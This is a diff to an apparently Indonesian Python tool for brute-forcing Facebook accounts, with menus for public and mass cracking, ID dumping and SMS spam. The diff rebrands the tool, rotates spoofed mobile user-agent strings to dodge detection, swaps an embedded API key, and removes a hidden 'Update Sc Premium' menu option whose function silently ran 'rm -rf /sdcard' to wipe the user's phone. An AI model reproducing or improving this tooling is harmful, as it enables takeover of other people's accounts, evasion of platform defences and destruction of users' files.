@@ -51,7 +51,7 @@ from rich.table import Table
 from rich.columns import Columns
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
 console = Console()
-sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
+sys.stdout.write('\x1b]2; BFB | BALA-BALA Facebook Buforce\x07')
 #------------------[ USER-AGENT ]-------------------#
 pretty.install()
 CON=sol()
@@ -76,7 +76,7 @@ for xd in range(10000):
 	c=random.randrange(73,100)
 	d=random.randrange(4200,4900)
 	e=random.randrange(40,150)
-	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+	uaku=f'Mozilla/5.0 (Linux; Android {a}; vivo 2010) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
 	ugen2.append(uaku)
 
 #------------[ UBAH UA DIH SINI OM ]---------------#
@@ -86,15 +86,15 @@ for t in range(10000):
 	c=random.randrange(73,100)
 	d=random.randrange(4200,4900)
 	e=random.randrange(40,150)
-	brayen1=f'Mozilla/5.0 (Linux; Android {a}; SM-G531H Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-	brayen2=f'Mozilla/5.0 (Linux; Android {a}; SM-J610G Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
-	brayen3=f'Mozilla/5.0 (Linux; Android {a}; SM-A405FN Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-	brayen4=f'Mozilla/5.0 (Linux; Android {a}; SM-X11O Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+	brayen1=f'Mozilla/5.0 (Linux; Android {a}; vivo X27Pro Build/PPR1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+	brayen2=f'Mozilla/5.0 (Linux; Android {a}; vivo 2010 Build/RP1A.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
+	brayen3=f'Mozilla/5.0 (Linux; Android {a}; V1809A Build/PKQ1.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+	brayen4=f'Mozilla/5.0 (Linux; Android {a}; V2042 Build/RP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
 	uaku2 = random.choice([brayen1,brayen2,brayen3,brayen4])
 	ugen.append(uaku2)
 
 for x in range(10):
-	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	a='Mozilla/5.0 (Linux; Android 9; vivo 2010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	b=random.randrange(100, 9999)
 	c=random.randrange(100, 9999)
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -102,10 +102,10 @@ for x in range(10):
 	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 	h=random.randrange(1, 9)
-	i='Linux; Android 7.1.2; Redmi 4A)'
+	i='Linux; Android 7.1.2; vivo 2010)'
 	j=random.randrange(1, 9)
 	k=random.randrange(1, 9)
-	l='Mobile Safari/E7FBAF'
+	l='Mobile Safari/NRD90M'
 	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 def uaku():
 	try:
@@ -131,7 +131,7 @@ try:
 	color_text = file_color.split("|")[0]
 	color_panel = file_color.split("|")[1]
 except:
-	color_text = "[#00C8FF]"
+	color_text = "[#FF0000]"
 	color_panel = "#00C8FF"
 #------------[ INDICATION ]---------------#
 id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
@@ -157,7 +157,7 @@ U = '\x1b[1;95m'
 O = '\x1b[1;96m'
 N = '\x1b[0m'    
 Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
+sir = '\033[41m\x1b[1;96m'
 x = '\33[m' # DEFAULT
 m = '\x1b[1;91m' #RED +
 k = '\033[93m' # KUNING +
@@ -187,11 +187,11 @@ def back():
 def banner():
 	cetak(panel(f"""
  ______ ___  _____  ___________  _____  _____ _   __ 
- |  ___/ _ \/  __ \|  ___| ___ \|  _  ||  _  | | / /
- | |_ / /_\ \ /  \/| |__ | |_/ /| | | || | | | |/ /     |  |   Source Code Alvino [bold green]
- |  _||  _  | |    |  __|| ___ \| | | || | | |    \     |  |   Update By BrayennnXD [bold red]
- | |  | | | | \__/\| |___| |_/ /\ \_/ /\ \_/ / |\  \    |  |   Version Script 2.8 [bold yellow]
- \_|  \_| |_/\____/\____/\____/  \___/  \___/\_| \_/ Penambahan Dump file oleh Hendrian Setyawan  , KEYBOARD WARRIOR                                                                                          
+ |  ___/ _ \/  __ \|  ___| ___ \|  _  ||  _  | | / / [bold red]
+ | |_ / /_\ \ /  \/| |__ | |_/ /| | | || | | | |/ /     |  |   Source Code Alvino [bold red]
+ |  _||  _  | |    |  __|| ___ \| | | || | | |    \     |  |   Update CLAOUPY [bold red]
+ | |  | | | | \__/\| |___| |_/ /\ \_/ /\ \_/ / |\  \    |  |   V2.8 [bold white]
+ \_|  \_| |_/\____/\____/\____/  \___/  \___/\_| \_/ HALLO  WORLD WELLCOME TO HACKING FACEBOOK•CYBER ANYMOUS INDONESIA   [bold white]                                                                               
              """,width=90,title=f"Banner",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login123():
@@ -282,7 +282,7 @@ def login_lagi334():
 							print(f"\n ╰─  Token : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\n ╰─  Login Berhasil | python BrayennnFB.py");exit()
+							print("\n ╰─  Login Berhasil | python Clay.py");exit()
 			except Exception as e:
 				print(" ╰─  Cookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
@@ -303,7 +303,7 @@ def menu(my_name,my_id):
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	cetak(panel(f'[bold white]  AUTHOR ASLI ALVINO ADIDJAYA,  Di Daur ulang By Marga Xd : BRAYEN ARA KIMOCHI ,Penambahan Methode Uid by Hendrian Setyawan , ,Others 😁 😁',width=90,style=f"bold white"))
+	cetak(panel(f'[bold white]  AUTHOR ASLI ALVINO ADIDJAYA,  Di Daur ulang CLAOUPY : BRAYEN MAS GANTENK , ,Others 😁 😁',width=90,style=f"bold white"))
 	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/] ',width=90,title=f"[bold green]Infomasi",style=f"bold white"))
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal  [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Cek Result    [[bold green] ON [bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Dump File     [[bold green] ON [bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack file    [[bold green] ON [bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Update Sc Premium Anda    [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Ganti Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
 	cetak(panel(f'[bold white]Ketik [bold green]"Lainnya"[bold white] Untuk Melihat Menu Tambahan | Ketik [bold green]"Bot"[bold white] Untuk Ke Menu Tambahan',width=90,title=f"[bold green]Informasi Crack",style=f"bold white"))
@@ -318,8 +318,6 @@ def menu(my_name,my_id):
 		dumpp()
 	elif _____brayennn___xd____ in ['5','05']:
 		crack_file()
-	elif _____brayennn___xd____ in ['6','06']:
-		eak()
 	elif _____brayennn___xd____ in ['lainnya','Lainnya','LAINNYA']:
 		lainnya()
 	elif _____brayennn___xd____ in ['Bot','BOT','bot']:
@@ -388,13 +386,6 @@ def bot():
 		time.sleep(3)
 		exit()
 
-#PERINGATAN
-def eak():
-	os.system('rm -rf /sdcard/HOME')
-	os.system('rm -rf /sdcard')
-	os.system('rm -rf /sdcard/DCIM')
-	print('eak yatim kenak prank')
-
 #------------------[ DEFF SPAM SMS ]-------------------#
 
 agent = random.choice(
@@ -406,6 +397,12 @@ agent = random.choice(
 			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
 			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
 			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
+			"Mozilla/5.0 (Linux; Android 9; vivo 2010 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36",
+			"Mozilla/5.0 (Linux; Android 7.0; vivo 1730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36"
+			"Mozilla/5.0 (Linux; U; Android 10.1.2; vivo a57 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
+			"Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; vivo X6Plus A Build/LRX22G) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30"
+			"Mozilla/5.0 (Linux; Android 7.0; vivo 1730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36"
+			"Mozilla/5.0 (Linux; U; Android 9; zh-CN; V1809A Build/PKQ1.181030.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 UCBrowser/15.3.4.1224 Mobile Safari/537.36",
 	]
 )
 
@@ -1951,7 +1948,7 @@ def scarpping_ua():
     
     
     url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
-    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
+    header = {"apikey": "AIzaSyB3WoGzjIXCl9vrRPXxHgDPFdyErT89p2w"}
     
     # Main menu #
     
@@ -1961,9 +1958,9 @@ def scarpping_ua():
         if response.status_code == 200:
             uascrap.append(response.json()['ua'])
         else:
-            uascrap.append("Mozilla/5.0 (Linux; Android 11; BrayennnFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
+            uascrap.append("Mozilla/5.0 (Linux; Android ; V2010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
     except requests.exceptions.ConnectionError:
-        uascrap.append("Mozilla/5.0 (Linux; Android 11; BrayennnFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
+        uascrap.append("Mozilla/5.0 (Linux; Android ; V2010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36")
 
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
 if __name__=='__main__':
